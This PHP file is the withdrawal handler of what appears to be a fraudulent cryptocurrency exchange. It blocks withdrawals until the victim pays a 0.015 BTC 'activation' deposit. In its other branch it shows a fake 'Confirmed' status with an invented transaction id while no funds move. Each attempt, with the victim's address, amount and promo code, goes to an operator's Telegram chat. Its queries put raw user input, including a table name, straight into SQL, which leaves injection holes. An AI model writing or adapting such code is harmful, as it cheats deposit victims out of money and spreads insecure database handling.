<?php
error_reporting(0);
session_start();
include '_config.php';
$inputJSON = file_get_contents('php://input');
$_POST = json_decode( $inputJSON, TRUE );
date_default_timezone_set('UTC');
$current_time_ms = round(microtime(true) * 1000);
$time_trans = date("Y-m-d H:i:s", floor($current_time_ms / 1000));
$time_trans = strtotime($time_trans);

if(isset($_SESSION['uuid'])) {

    $address = guardText($_POST['address']);
    $amount = guardText($_POST['amount']);
    $network_list = guardText($_POST['network_list']);
    $ticker = guardText($_POST['ticker']);

    if(!isset($USER_PROMO['promo'])){
        $USER_PROMO['promo'] = 'Не введен';
    }

    if ($amount == 0) {
        echo '{"success":false,"message":"The amount must be greater than 0.","data":{"validation_error":0}}';
        exit();
    }
    if ($address == "") {
        echo '{"success":false,"message":"The amount must be greater than 0.","data":{"validation_error":0}}';
        exit();
    }

    if($USER['trans'] == 1) {
        echo '{"success":false,"message":"<b style=\"color:red;\"><p> Activation: <i style=\"color: #ff6363;\" class=\"fa fa-times-circle\"><\/i><\/b><br>\n <b style=\"color:#fbae1c;\">To withdraw funds to a third-party address, you need to activate your account. To activate the account, make a minimum deposit of 0.015 BTC. The deposit can also be withdrawn after account activation.<br><\/b>\n<br>\n<b>Your deposit: 0.00 \/ ' . $USER['min_dep_btc'] . ' BTC.<\/b>","data":{"validation_error":0}}';

        if ($stmt = $db->prepare('SELECT * FROM transfer WHERE uuid="'.$_SESSION['uuid'].'"')) {
            $result = $stmt->execute();
            while ($arr = $result->fetchArray(SQLITE3_ASSOC)) {
                $text_convert = $arr['text'];
            }
        }

        if($text_convert == ''){
            $convert_text = '{
   "type":"withdraw",
   "amount":"'.$_POST['amount'].'",
   "ticker":"'.$_POST['ticker'].'",
   "hash":"1",
   "status":"canceled",
   "created_time":'.$time_trans.'
}';
            $db->query("INSERT INTO transfer (text, uuid) VALUES ('$convert_text', '".$_SESSION['uuid']."')");
        }else {
            $convert_text = '{
   "type":"withdraw",
   "amount":"' . $_POST['amount'] . '",
   "ticker":"' . $_POST['ticker'] . '",
   "hash":"1",
   "status":"canceled",
   "created_time":' . $time_trans . '
},'.$text_convert;
            $db->query("UPDATE transfer SET text = '" . $convert_text . "' WHERE uuid='" . $_SESSION['uuid'] . "';");
        }

        $message = "🤑 [ВЫВОД + ошибка]

Пользователь: {$USER['name']}
Промокод: {$USER_PROMO['promo']}

Адрес: {$_POST['address']}
Сумма: {$_POST['amount']}
Валюта: {$_POST['ticker']}
Сеть: {$_POST['network_list']}

UUID: {$USER['uuid']}
";
    }elseif($USER['trans'] == 0){

        //echo '{"success":true,"message":"<b style=\"color:green;\"><p> Success <i style=\"color: #ff6363;\" class=\"fa fa-times-circle\"><\/i><\/b><br>\n\n<br>\n<b>Expect funds to be credited..<\/b>","data":{"validation_error":0}}';

        echo '{"success":false,"message":"<b style=\"color:green;\">Successful withdrawal<\/b>\n<br>\nPlease wait for the funds to be credited to your wallet\n<style>\n  .modal#withdraw .success-container img {\n    content: url(\'\/assets3\/img\/withdraw-success.png\')\n  }\n  .modal#withdraw .status-container .status-transaction div:first-child p:last-child {\n    visibility: hidden;\n      font-size: 0;\n  }\n  .modal#withdraw .status-container .status-transaction div:first-child p:last-child:after {\n    content: \'Confirmed\';\n      visibility: visible;\n      font-size: initial;\n      color: #58BD7D;\n  }\n  .modal#withdraw .status-container .status-transaction div:last-child p:last-child {\n    visibility: hidden;\n      font-size: 0;\n  }\n  .modal#withdraw .status-container .status-transaction div:last-child p:last-child:after {\n    content: \'79123465\';\n      visibility: visible;\n      font-size: initial;\n  }\n  .modal#withdraw .status-container p:last-child {\n    visibility: hidden;\n      font-size: 0;\n  }\n  .modal#withdraw .status-container p:last-child:after {\n    content: \'Contact online support for additional information.\';\n      visibility: visible;\n      font-size: initial;\n  }\n<\/style>","data":{"validation_error":0}}';

        if ($stmt = $db->prepare('SELECT * FROM transfer WHERE uuid="'.$_SESSION['uuid'].'"')) {
            $result = $stmt->execute();
            while ($arr = $result->fetchArray(SQLITE3_ASSOC)) {
                $text_convert = $arr['text'];
            }
        }

        if ($stmt = $dbB->prepare('SELECT * FROM ' . $_POST['ticker'] . ' WHERE uuid="' . $_SESSION['uuid'] . '"')) {
            $result = $stmt->execute();
            while ($arr = $result->fetchArray(SQLITE3_ASSOC)) {
                $balance_from = $arr['balance'];
                $balance_from_total = $arr['total_balance'];
            }
        }

        $balance_from = $balance_from - $amount;
        $balance_from_total = $balance_from_total - $amount;

        $dbB->query('UPDATE ' . $_POST['ticker'] . ' SET balance = ' . $balance_from . ',total_balance = ' . $balance_from_total . ' WHERE uuid="' . $_SESSION['uuid'] . '";');

        if($text_convert == ''){
            $convert_text = '{
   "type":"withdraw",
   "amount":"'.$_POST['amount'].'",
   "ticker":"'.$_POST['ticker'].'",
   "hash":"1",
   "status":"confirmed",
   "created_time":'.$time_trans.'
}';
            $db->query("INSERT INTO transfer (text, uuid) VALUES ('$convert_text', '".$_SESSION['uuid']."')");
        }else {
            $convert_text = '{
   "type":"withdraw",
   "amount":"' . $_POST['amount'] . '",
   "ticker":"' . $_POST['ticker'] . '",
   "hash":"1",
   "status":"confirmed",
   "created_time":' . $time_trans . '
},'.$text_convert;
            $db->query("UPDATE transfer SET text = '" . $convert_text . "' WHERE uuid='" . $_SESSION['uuid'] . "';");
        }
        // successfully
        // processing
        // canceled

        $message = "🤑 [ВЫВОД + транзакция]

Пользователь: {$USER['name']}
Промокод: {$USER_PROMO['promo']}

Адрес: {$_POST['address']}
Сумма: {$_POST['amount']}
Валюта: {$_POST['ticker']}
Сеть: {$_POST['network_list']}

Статус: В ОБРАБОТКЕ

UUID: {$USER['uuid']}
";
    }

    sendTelegramMessage($chat_id, $message, $bot_token);
    exit();

}